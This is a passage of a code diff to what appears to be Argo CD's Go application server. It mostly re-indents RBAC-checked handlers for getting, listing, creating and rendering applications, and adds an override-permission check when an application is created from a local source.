{\n+                user = \"Unknown user\"\n+        }\n+        logCtx := log.WithFields(map[string]interface{}{\n+                \"user\":        user,\n+                \"application\": name,\n+                \"namespace\":   namespace,\n+        })\n+        if project != \"\" {\n+                // The user has provided everything we need to perform an initial RBAC check.\n+                givenRBACName := security.RBACName(s.ns, project, namespace, name)\n+                if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, action, givenRBACName); err != nil {\n+                        logCtx.WithFields(map[string]interface{}{\n+                                \"project\":                project,\n+                                argocommon.SecurityField: argocommon.SecurityMedium,\n+                        }).Warnf(\"user tried to %s application which they do not have access to: %s\", action, err)\n+                        // Do a GET on the app. This ensures that the timing of a \"no access\" response is the same as a \"yes access,\n+                        // but the app is in a different project\" response. We don't want the user inferring the existence of the\n+                        // app from response time.\n+                        _, _ = getApp()\n+                        return nil, permissionDeniedErr\n+                }\n+        }\n+        a, err := getApp()\n+        if err != nil {\n+                if apierr.IsNotFound(err) {\n+                        if project != \"\" {\n+                                // We know that the user was allowed to get the Application, but the Application does not exist. Return 404.\n+                                return nil, status.Errorf(codes.NotFound, apierr.NewNotFound(schema.GroupResource{Group: \"argoproj.io\", Resource: \"applications\"}, name).Error())\n+                        }\n+                        // We don't know if the user was allowed to get the Application, and we don't want to leak information about\n+                        // the Application's existence. Return 403.\n+                        logCtx.Warn(\"application does not exist\")\n+                        return nil, permissionDeniedErr\n+                }\n+                logCtx.Errorf(\"failed to get application: %s\", err)\n+                return nil, permissionDeniedErr\n+        }\n+        // Even if we performed an initial RBAC check (because the request was fully parameterized), we still need to\n+        // perform a second RBAC check to ensure that the user has access to the actual Application's project (not just the\n+        // project they specified in the request).\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, action, a.RBACName(s.ns)); err != nil {\n+                logCtx.WithFields(map[string]interface{}{\n+                        \"project\":                a.Spec.Project,\n+                        argocommon.SecurityField: argocommon.SecurityMedium,\n+                }).Warnf(\"user tried to %s application which they do not have access to: %s\", action, err)\n+                if project != \"\" {\n+                        // The user specified a project. We would have returned a 404 if the user had access to the app, but the app\n+                        // did not exist. So we have to return a 404 when the app does exist, but the user does not have access.\n+                        // Otherwise, they could infer that the app exists based on the error code.\n+                        return nil, status.Errorf(codes.NotFound, apierr.NewNotFound(schema.GroupResource{Group: \"argoproj.io\", Resource: \"applications\"}, name).Error())\n+                }\n+                // The user didn't specify a project. We always return permission denied for both lack of access and lack of\n+                // existence.\n+                return nil, permissionDeniedErr\n+        }\n+        effectiveProject := \"default\"\n+        if a.Spec.Project != \"\" {\n+                effectiveProject = a.Spec.Project\n+        }\n+        if project != \"\" && effectiveProject != project {\n+                logCtx.WithFields(map[string]interface{}{\n+                        \"project\":                a.Spec.Project,\n+                        argocommon.SecurityField: argocommon.SecurityMedium,\n+                }).Warnf(\"user tried to %s application in project %s, but the application is in project %s\", action, project, effectiveProject)\n+                // The user has access to the app, but the app is in a different project. Return 404, meaning \"app doesn't\n+                // exist in that project\".\n+                return nil, status.Errorf(codes.NotFound, apierr.NewNotFound(schema.GroupResource{Group: \"argoproj.io\", Resource: \"applications\"}, name).Error())\n+        }\n+        return a, nil\n }\n \n // getApplicationEnforceRBACInformer uses an informer to get an Application. If the app does not exist, permission is\n // denied, or any other error occurs when getting the app, we return a permission denied error to obscure any sensitive\n // information.\n func (s *Server) getApplicationEnforceRBACInformer(ctx context.Context, action, project, namespace, name string) (*appv1.Application, error) {\n-\tnamespaceOrDefault := s.appNamespaceOrDefault(namespace)\n-\treturn s.getAppEnforceRBAC(ctx, action, project, namespaceOrDefault, name, func() (*appv1.Application, error) {\n-\t\treturn s.appLister.Applications(namespaceOrDefault).Get(name)\n-\t})\n+        namespaceOrDefault := s.appNamespaceOrDefault(namespace)\n+        return s.getAppEnforceRBAC(ctx, action, project, namespaceOrDefault, name, func() (*appv1.Application, error) {\n+                return s.appLister.Applications(namespaceOrDefault).Get(name)\n+        })\n }\n \n // getApplicationEnforceRBACClient uses a client to get an Application. If the app does not exist, permission is denied,\n // or any other error occurs when getting the app, we return a permission denied error to obscure any sensitive\n // information.\n func (s *Server) getApplicationEnforceRBACClient(ctx context.Context, action, project, namespace, name, resourceVersion string) (*appv1.Application, error) {\n-\tnamespaceOrDefault := s.appNamespaceOrDefault(namespace)\n-\treturn s.getAppEnforceRBAC(ctx, action, project, namespaceOrDefault, name, func() (*appv1.Application, error) {\n-\t\tif !s.isNamespaceEnabled(namespaceOrDefault) {\n-\t\t\treturn nil, security.NamespaceNotPermittedError(namespaceOrDefault)\n-\t\t}\n-\t\treturn s.appclientset.ArgoprojV1alpha1().Applications(namespaceOrDefault).Get(ctx, name, metav1.GetOptions{\n-\t\t\tResourceVersion: resourceVersion,\n-\t\t})\n-\t})\n+        namespaceOrDefault := s.appNamespaceOrDefault(namespace)\n+        return s.getAppEnforceRBAC(ctx, action, project, namespaceOrDefault, name, func() (*appv1.Application, error) {\n+                if !s.isNamespaceEnabled(namespaceOrDefault) {\n+                        return nil, security.NamespaceNotPermittedError(namespaceOrDefault)\n+                }\n+                return s.appclientset.ArgoprojV1alpha1().Applications(namespaceOrDefault).Get(ctx, name, metav1.GetOptions{\n+                        ResourceVersion: resourceVersion,\n+                })\n+        })\n }\n \n // List returns list of applications\n func (s *Server) List(ctx context.Context, q *application.ApplicationQuery) (*appv1.ApplicationList, error) {\n-\tselector, err := labels.Parse(q.GetSelector())\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error parsing the selector: %w\", err)\n-\t}\n-\tvar apps []*appv1.Application\n-\tif q.GetAppNamespace() == \"\" {\n-\t\tapps, err = s.appLister.List(selector)\n-\t} else {\n-\t\tapps, err = s.appLister.Applications(q.GetAppNamespace()).List(selector)\n-\t}\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error listing apps with selectors: %w\", err)\n-\t}\n-\n-\tfilteredApps := apps\n-\t// Filter applications by name\n-\tif q.Name != nil {\n-\t\tfilteredApps = argoutil.FilterByNameP(filteredApps, *q.Name)\n-\t}\n-\n-\t// Filter applications by projects\n-\tfilteredApps = argoutil.FilterByProjectsP(filteredApps, getProjectsFromApplicationQuery(*q))\n-\n-\t// Filter applications by source repo URL\n-\tfilteredApps = argoutil.FilterByRepoP(filteredApps, q.GetRepo())\n-\n-\tnewItems := make([]appv1.Application, 0)\n-\tfor _, a := range filteredApps {\n-\t\t// Skip any application that is neither in the control plane's namespace\n-\t\t// nor in the list of enabled namespaces.\n-\t\tif !s.isNamespaceEnabled(a.Namespace) {\n-\t\t\tcontinue\n-\t\t}\n-\t\tif s.enf.Enforce(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionGet, a.RBACName(s.ns)) {\n-\t\t\tnewItems = append(newItems, *a)\n-\t\t}\n-\t}\n-\n-\t// Sort found applications by name\n-\tsort.Slice(newItems, func(i, j int) bool {\n-\t\treturn newItems[i].Name < newItems[j].Name\n-\t})\n-\n-\tappList := appv1.ApplicationList{\n-\t\tListMeta: metav1.ListMeta{\n-\t\t\tResourceVersion: s.appInformer.LastSyncResourceVersion(),\n-\t\t},\n-\t\tItems: newItems,\n-\t}\n-\treturn &appList, nil\n+        selector, err := labels.Parse(q.GetSelector())\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error parsing the selector: %w\", err)\n+        }\n+        var apps []*appv1.Application\n+        if q.GetAppNamespace() == \"\" {\n+                apps, err = s.appLister.List(selector)\n+        } else {\n+                apps, err = s.appLister.Applications(q.GetAppNamespace()).List(selector)\n+        }\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error listing apps with selectors: %w\", err)\n+        }\n+\n+        filteredApps := apps\n+        // Filter applications by name\n+        if q.Name != nil {\n+                filteredApps = argoutil.FilterByNameP(filteredApps, *q.Name)\n+        }\n+\n+        // Filter applications by projects\n+        filteredApps = argoutil.FilterByProjectsP(filteredApps, getProjectsFromApplicationQuery(*q))\n+\n+        // Filter applications by source repo URL\n+        filteredApps = argoutil.FilterByRepoP(filteredApps, q.GetRepo())\n+\n+        newItems := make([]appv1.Application, 0)\n+        for _, a := range filteredApps {\n+                // Skip any application that is neither in the control plane's namespace\n+                // nor in the list of enabled namespaces.\n+                if !s.isNamespaceEnabled(a.Namespace) {\n+                        continue\n+                }\n+                if s.enf.Enforce(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionGet, a.RBACName(s.ns)) {\n+                        newItems = append(newItems, *a)\n+                }\n+        }\n+\n+        // Sort found applications by name\n+        sort.Slice(newItems, func(i, j int) bool {\n+                return newItems[i].Name < newItems[j].Name\n+        })\n+\n+        appList := appv1.ApplicationList{\n+                ListMeta: metav1.ListMeta{\n+                        ResourceVersion: s.appInformer.LastSyncResourceVersion(),\n+                },\n+                Items: newItems,\n+        }\n+        return &appList, nil\n }\n \n // Create creates an application\n func (s *Server) Create(ctx context.Context, q *application.ApplicationCreateRequest) (*appv1.Application, error) {\n-\tif q.GetApplication() == nil {\n-\t\treturn nil, fmt.Errorf(\"error creating application: application is nil in request\")\n-\t}\n-\ta := q.GetApplication()\n-\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionCreate, a.RBACName(s.ns)); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\ts.projectLock.RLock(a.Spec.GetProject())\n-\tdefer s.projectLock.RUnlock(a.Spec.GetProject())\n-\n-\tvalidate := true\n-\tif q.Validate != nil {\n-\t\tvalidate = *q.Validate\n-\t}\n-\terr := s.validateAndNormalizeApp(ctx, a, validate)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error while validating and normalizing app: %w\", err)\n-\t}\n-\n-\tappNs := s.appNamespaceOrDefault(a.Namespace)\n-\n-\tif !s.isNamespaceEnabled(appNs) {\n-\t\treturn nil, security.NamespaceNotPermittedError(appNs)\n-\t}\n-\n-\tcreated, err := s.appclientset.ArgoprojV1alpha1().Applications(appNs).Create(ctx, a, metav1.CreateOptions{})\n-\tif err == nil {\n-\t\ts.logAppEvent(created, ctx, argo.EventReasonResourceCreated, \"created application\")\n-\t\ts.waitSync(created)\n-\t\treturn created, nil\n-\t}\n-\tif !apierr.IsAlreadyExists(err) {\n-\t\treturn nil, fmt.Errorf(\"error creating application: %w\", err)\n-\t}\n-\n-\t// act idempotent if existing spec matches new spec\n-\texisting, err := s.appLister.Applications(appNs).Get(a.Name)\n-\tif err != nil {\n-\t\treturn nil, status.Errorf(codes.Internal, \"unable to check existing application details (%s): %v\", appNs, err)\n-\t}\n-\tequalSpecs := reflect.DeepEqual(existing.Spec, a.Spec) &&\n-\t\treflect.DeepEqual(existing.Labels, a.Labels) &&\n-\t\treflect.DeepEqual(existing.Annotations, a.Annotations) &&\n-\t\treflect.DeepEqual(existing.Finalizers, a.Finalizers)\n-\n-\tif equalSpecs {\n-\t\treturn existing, nil\n-\t}\n-\tif q.Upsert == nil || !*q.Upsert {\n-\t\treturn nil, status.Errorf(codes.InvalidArgument, \"existing application spec is different, use upsert flag to force update\")\n-\t}\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionUpdate, a.RBACName(s.ns)); err != nil {\n-\t\treturn nil, err\n-\t}\n-\tupdated, err := s.updateApp(existing, a, ctx, true)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error updating application: %w\", err)\n-\t}\n-\treturn updated, nil\n+        if q.GetApplication() == nil {\n+                return nil, fmt.Errorf(\"error creating application: application is nil in request\")\n+        }\n+        a := q.GetApplication()\n+\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionCreate, a.RBACName(s.ns)); err != nil {\n+                return nil, err\n+        }\n+        if a.Spec.Source.IsLocal() {\n+                if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionOverride, a.RBACName(s.ns)); err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        s.projectLock.RLock(a.Spec.GetProject())\n+        defer s.projectLock.RUnlock(a.Spec.GetProject())\n+\n+        validate := true\n+        if q.Validate != nil {\n+                validate = *q.Validate\n+        }\n+        err := s.validateAndNormalizeApp(ctx, a, validate)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error while validating and normalizing app: %w\", err)\n+        }\n+\n+        appNs := s.appNamespaceOrDefault(a.Namespace)\n+\n+        if !s.isNamespaceEnabled(appNs) {\n+                return nil, security.NamespaceNotPermittedError(appNs)\n+        }\n+\n+        created, err := s.appclientset.ArgoprojV1alpha1().Applications(appNs).Create(ctx, a, metav1.CreateOptions{})\n+        if err == nil {\n+                s.logAppEvent(created, ctx, argo.EventReasonResourceCreated, \"created application\")\n+                s.waitSync(created)\n+                return created, nil\n+        }\n+        if !apierr.IsAlreadyExists(err) {\n+                return nil, fmt.Errorf(\"error creating application: %w\", err)\n+        }\n+\n+        // act idempotent if existing spec matches new spec\n+        existing, err := s.appLister.Applications(appNs).Get(a.Name)\n+        if err != nil {\n+                return nil, status.Errorf(codes.Internal, \"unable to check existing application details (%s): %v\", appNs, err)\n+        }\n+        equalSpecs := reflect.DeepEqual(existing.Spec, a.Spec) &&\n+                reflect.DeepEqual(existing.Labels, a.Labels) &&\n+                reflect.DeepEqual(existing.Annotations, a.Annotations) &&\n+                reflect.DeepEqual(existing.Finalizers, a.Finalizers)\n+\n+        if equalSpecs {\n+                return existing, nil\n+        }\n+        if q.Upsert == nil || !*q.Upsert {\n+                return nil, status.Errorf(codes.InvalidArgument, \"existing application spec is different, use upsert flag to force update\")\n+        }\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionUpdate, a.RBACName(s.ns)); err != nil {\n+                return nil, err\n+        }\n+        updated, err := s.updateApp(existing, a, ctx, true)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error updating application: %w\", err)\n+        }\n+        return updated, nil\n }\n \n func (s *Server) queryRepoServer(ctx context.Context, a *appv1.Application, action func(\n-\tclient apiclient.RepoServerServiceClient,\n-\trepo *appv1.Repository,\n-\thelmRepos []*appv1.Repository,\n-\thelmCreds []*appv1.RepoCreds,\n-\thelmOptions *appv1.HelmOptions,\n-\tkustomizeOptions *appv1.KustomizeOptions,\n-\tenabledSourceTypes map[string]bool,\n+        client apiclient.RepoServerServiceClient,\n+        repo *appv1.Repository,\n+        helmRepos []*appv1.Repository,\n+        helmCreds []*appv1.RepoCreds,\n+        helmOptions *appv1.HelmOptions,\n+        kustomizeOptions *appv1.KustomizeOptions,\n+        enabledSourceTypes map[string]bool,\n ) error) error {\n \n-\tcloser, client, err := s.repoClientset.NewRepoServerClient()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error creating repo server client: %w\", err)\n-\t}\n-\tdefer ioutil.Close(closer)\n-\trepo, err := s.db.GetRepository(ctx, a.Spec.GetSource().RepoURL)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting repository: %w\", err)\n-\t}\n-\tkustomizeSettings, err := s.settingsMgr.GetKustomizeSettings()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting kustomize settings: %w\", err)\n-\t}\n-\tkustomizeOptions, err := kustomizeSettings.GetOptions(a.Spec.GetSource())\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting kustomize settings options: %w\", err)\n-\t}\n-\tproj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n-\tif err != nil {\n-\t\tif apierr.IsNotFound(err) {\n-\t\t\treturn status.Errorf(codes.InvalidArgument, \"application references project %s which does not exist\", a.Spec.Project)\n-\t\t}\n-\t\treturn fmt.Errorf(\"error getting application's project: %w\", err)\n-\t}\n-\n-\thelmRepos, err := s.db.ListHelmRepositories(ctx)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error listing helm repositories: %w\", err)\n-\t}\n-\n-\tpermittedHelmRepos, err := argo.GetPermittedRepos(proj, helmRepos)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error retrieving permitted repos: %w\", err)\n-\t}\n-\thelmRepositoryCredentials, err := s.db.GetAllHelmRepositoryCredentials(ctx)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting helm repository credentials: %w\", err)\n-\t}\n-\thelmOptions, err := s.settingsMgr.GetHelmSettings()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting helm settings: %w\", err)\n-\t}\n-\tpermittedHelmCredentials, err := argo.GetPermittedReposCredentials(proj, helmRepositoryCredentials)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting permitted repos credentials: %w\", err)\n-\t}\n-\tenabledSourceTypes, err := s.settingsMgr.GetEnabledSourceTypes()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting settings enabled source types: %w\", err)\n-\t}\n-\treturn action(client, repo, permittedHelmRepos, permittedHelmCredentials, helmOptions, kustomizeOptions, enabledSourceTypes)\n+        closer, client, err := s.repoClientset.NewRepoServerClient()\n+        if err != nil {\n+                return fmt.Errorf(\"error creating repo server client: %w\", err)\n+        }\n+        defer ioutil.Close(closer)\n+        repo, err := s.db.GetRepository(ctx, a.Spec.GetSource().RepoURL)\n+        if err != nil {\n+                return fmt.Errorf(\"error getting repository: %w\", err)\n+        }\n+        kustomizeSettings, err := s.settingsMgr.GetKustomizeSettings()\n+        if err != nil {\n+                return fmt.Errorf(\"error getting kustomize settings: %w\", err)\n+        }\n+        kustomizeOptions, err := kustomizeSettings.GetOptions(a.Spec.GetSource())\n+        if err != nil {\n+                return fmt.Errorf(\"error getting kustomize settings options: %w\", err)\n+        }\n+        proj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n+        if err != nil {\n+                if apierr.IsNotFound(err) {\n+                        return status.Errorf(codes.InvalidArgument, \"application references project %s which does not exist\", a.Spec.Project)\n+                }\n+                return fmt.Errorf(\"error getting application's project: %w\", err)\n+        }\n+\n+        helmRepos, err := s.db.ListHelmRepositories(ctx)\n+        if err != nil {\n+                return fmt.Errorf(\"error listing helm repositories: %w\", err)\n+        }\n+\n+        permittedHelmRepos, err := argo.GetPermittedRepos(proj, helmRepos)\n+        if err != nil {\n+                return fmt.Errorf(\"error retrieving permitted repos: %w\", err)\n+        }\n+        helmRepositoryCredentials, err := s.db.GetAllHelmRepositoryCredentials(ctx)\n+        if err != nil {\n+                return fmt.Errorf(\"error getting helm repository credentials: %w\", err)\n+        }\n+        helmOptions, err := s.settingsMgr.GetHelmSettings()\n+        if err != nil {\n+                return fmt.Errorf(\"error getting helm settings: %w\", err)\n+        }\n+        permittedHelmCredentials, err := argo.GetPermittedReposCredentials(proj, helmRepositoryCredentials)\n+        if err != nil {\n+                return fmt.Errorf(\"error getting permitted repos credentials: %w\", err)\n+        }\n+        enabledSourceTypes, err := s.settingsMgr.GetEnabledSourceTypes()\n+        if err != nil {\n+                return fmt.Errorf(\"error getting settings enabled source types: %w\", err)\n+        }\n+        return action(client, repo, permittedHelmRepos, permittedHelmCredentials, helmOptions, kustomizeOptions, enabledSourceTypes)\n }\n \n // GetManifests returns application manifests\n func (s *Server) GetManifests(ctx context.Context, q *application.ApplicationManifestQuery) (*apiclient.ManifestResponse, error) {\n-\tif q.Name == nil || *q.Name == \"\" {\n-\t\treturn nil, fmt.Errorf(\"invalid request: application name is missing\")\n-\t}\n-\ta, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tsource := a.Spec.GetSource()\n-\n-\tif !s.isNamespaceEnabled(a.Namespace) {\n-\t\treturn nil, security.NamespaceNotPermittedError(a.Namespace)\n-\t}\n-\n-\tvar manifestInfo *apiclient.ManifestResponse\n-\terr = s.queryRepoServer(ctx, a, func(\n-\t\tclient apiclient.RepoServerServiceClient, repo *appv1.Repository, helmRepos []*appv1.Repository, helmCreds []*appv1.RepoCreds, helmOptions *appv1.HelmOptions, kustomizeOptions *appv1.KustomizeOptions, enableGenerateManifests map[string]bool) error {\n-\t\trevision := source.TargetRevision\n-\t\tif q.GetRevision() != \"\" {\n-\t\t\trevision = q.GetRevision()\n-\t\t}\n-\t\tappInstanceLabelKey, err := s.settingsMgr.GetAppInstanceLabelKey()\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting app instance label key from settings: %w\", err)\n-\t\t}\n-\n-\t\tconfig, err := s.getApplicationClusterConfig(ctx, a)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting application cluster config: %w\", err)\n-\t\t}\n-\n-\t\tserverVersion, err := s.kubectl.GetServerVersion(config)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting server version: %w\", err)\n-\t\t}\n-\n-\t\tapiResources, err := s.kubectl.GetAPIResources(config, false, kubecache.NewNoopSettings())\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting API resources: %w\", err)\n-\t\t}\n-\n-\t\tproj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting app project: %w\", err)\n-\t\t}\n-\n-\t\tmanifestInfo, err = client.GenerateManifest(ctx, &apiclient.ManifestRequest{\n-\t\t\tRepo:               repo,\n-\t\t\tRevision:           revision,\n-\t\t\tAppLabelKey:        appInstanceLabelKey,\n-\t\t\tAppName:            a.InstanceName(s.ns),\n-\t\t\tNamespace:          a.Spec.Destination.Namespace,\n-\t\t\tApplicationSource:  &source,\n-\t\t\tRepos:              helmRepos,\n-\t\t\tKustomizeOptions:   kustomizeOptions,\n-\t\t\tKubeVersion:        serverVersion,\n-\t\t\tApiVersions:        argo.APIResourcesToStrings(apiResources, true),\n-\t\t\tHelmRepoCreds:      helmCreds,\n-\t\t\tHelmOptions:        helmOptions,\n-\t\t\tTrackingMethod:     string(argoutil.GetTrackingMethod(s.settingsMgr)),\n-\t\t\tEnabledSourceTypes: enableGenerateManifests,\n-\t\t\tProjectName:        proj.Name,\n-\t\t\tProjectSourceRepos: proj.Spec.SourceRepos,\n-\t\t})\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error generating manifests: %w\", err)\n-\t\t}\n-\t\treturn nil\n-\t})\n-\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tfor i, manifest := range manifestInfo.Manifests {\n-\t\tobj := &unstructured.Unstructured{}\n-\t\terr = json.Unmarshal([]byte(manifest), obj)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error unmarshaling manifest into unstructured: %w\", err)\n-\t\t}\n-\t\tif obj.GetKind() == kube.SecretKind && obj.GroupVersionKind().Group == \"\" {\n-\t\t\tobj, _, err = diff.HideSecretData(obj, nil)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error hiding secret data: %w\", err)\n-\t\t\t}\n-\t\t\tdata, err := json.Marshal(obj)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"error marshaling manifest: %w\", err)\n-\t\t\t}\n-\t\t\tmanifestInfo.Manifests[i] = string(data)\n-\t\t}\n-\t}\n-\n-\treturn manifestInfo, nil\n+        if q.Name == nil || *q.Name == \"\" {\n+                return nil, fmt.Errorf(\"invalid request: application name is missing\")\n+        }\n+        a, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        source := a.Spec.GetSource()\n+\n+        if !s.isNamespaceEnabled(a.Namespace) {\n+                return nil, security.NamespaceNotPermittedError(a.Namespace)\n+        }\n+\n+        var manifestInfo *apiclient.ManifestResponse\n+        err = s.queryRepoServer(ctx, a, func(\n+                client apiclient.RepoServerServiceClient, repo *appv1.Repository, helmRepos []*appv1.Repository, helmCreds []*appv1.RepoCreds, helmOptions *appv1.HelmOptions, kustomizeOptions *appv1.KustomizeOptions, enableGenerateManifests map[string]bool) error {\n+                revision := source.TargetRevision\n+                if q.GetRevision() != \"\" {\n+                        revision = q.GetRevision()\n+                }\n+                appInstanceLabelKey, err := s.settingsMgr.GetAppInstanceLabelKey()\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting app instance label key from settings: %w\", err)\n+                }\n+\n+                config, err := s.getApplicationClusterConfig(ctx, a)\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting application cluster config: %w\", err)\n+                }\n+\n+                serverVersion, err := s.kubectl.GetServerVersion(config)\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting server version: %w\", err)\n+                }\n+\n+                apiResources, err := s.kubectl.GetAPIResources(config, false, kubecache.NewNoopSettings())\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting API resources: %w\", err)\n+                }\n+\n+                proj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting app project: %w\", err)\n+                }\n+\n+                manifestInfo, err = client.GenerateManifest(ctx, &apiclient.ManifestRequest{\n+                        Repo:               repo,\n+                        Revision:           revision,\n+                        AppLabelKey:        appInstanceLabelKey,\n+                        AppName:            a.InstanceName(s.ns),\n+                        Namespace:          a.Spec.Destination.Namespace,\n+                        ApplicationSource:  &source,\n+                        Repos:              helmRepos,\n+                        KustomizeOptions:   kustomizeOptions,\n+                        KubeVersion:        serverVersion,\n+                        ApiVersions:        argo.APIResourcesToStrings(apiResources, true),\n+                        HelmRepoCreds:      helmCreds,\n+                        HelmOptions:        helmOptions,\n+                        TrackingMethod:     string(argoutil.GetTrackingMethod(s.settingsMgr)),\n+                        EnabledSourceTypes: enableGenerateManifests,\n+                        ProjectName:        proj.Name,\n+                        ProjectSourceRepos: proj.Spec.SourceRepos,\n+                })\n+                if err != nil {\n+                        return fmt.Errorf(\"error generating manifests: %w\", err)\n+                }\n+                return nil\n+        })\n+\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        for i, manifest := range manifestInfo.Manifests {\n+                obj := &unstructured.Unstructured{}\n+                err = json.Unmarshal([]byte(manifest), obj)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error unmarshaling manifest into unstructured: %w\", err)\n+                }\n+                if obj.GetKind() == kube.SecretKind && obj.GroupVersionKind().Group == \"\" {\n+                        obj, _, err = diff.HideSecretData(obj, nil)\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error hiding secret data: %w\", err)\n+                        }\n+                        data, err := json.Marshal(obj)\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"error marshaling manifest: %w\", err)\n+                        }\n+                        manifestInfo.Manifests[i] = string(data)\n+                }\n+        }\n+\n+        return manifestInfo, nil\n }\n \n func (s *Server) GetManifestsWithFiles(stream application.ApplicationService_GetManifestsWithFilesServer) error {\n-\tctx := stream.Context()\n-\tquery, err := manifeststream.ReceiveApplicationManifestQueryWithFiles(stream)\n-\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting query: %w\", err)\n-\t}\n-\n-\tif query.Name == nil || *query.Name == \"\" {\n-\t\treturn fmt.Errorf(\"invalid request: application name is missing\")\n-\t}\n-\n-\ta, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, query.GetProject(), query.GetAppNamespace(), query.GetName())\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tvar manifestInfo *apiclient.ManifestResponse\n-\terr = s.queryRepoServer(ctx, a, func(\n-\t\tclient apiclient.RepoServerServiceClient, repo *appv1.Repository, helmRepos []*appv1.Repository, helmCreds []*appv1.RepoCreds, helmOptions *appv1.HelmOptions, kustomizeOptions *appv1.KustomizeOptions, enableGenerateManifests map[string]bool) error {\n-\n-\t\tappInstanceLabelKey, err := s.settingsMgr.GetAppInstanceLabelKey()\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting app instance label key from settings: %w\", err)\n-\t\t}\n-\n-\t\tconfig, err := s.getApplicationClusterConfig(ctx, a)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting application cluster config: %w\", err)\n-\t\t}\n-\n-\t\tserverVersion, err := s.kubectl.GetServerVersion(config)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting server version: %w\", err)\n-\t\t}\n-\n-\t\tapiResources, err := s.kubectl.GetAPIResources(config, false, kubecache.NewNoopSettings())\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting API resources: %w\", err)\n-\t\t}\n-\n-\t\tsource := a.Spec.GetSource()\n-\n-\t\tproj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting app project: %w\", err)\n-\t\t}\n-\n-\t\treq := &apiclient.ManifestRequest{\n-\t\t\tRepo:               repo,\n-\t\t\tRevision:           source.TargetRevision,\n-\t\t\tAppLabelKey:        appInstanceLabelKey,\n-\t\t\tAppName:            a.Name,\n-\t\t\tNamespace:          a.Spec.Destination.Namespace,\n-\t\t\tApplicationSource:  &source,\n-\t\t\tRepos:              helmRepos,\n-\t\t\tKustomizeOptions:   kustomizeOptions,\n-\t\t\tKubeVersion:        serverVersion,\n-\t\t\tApiVersions:        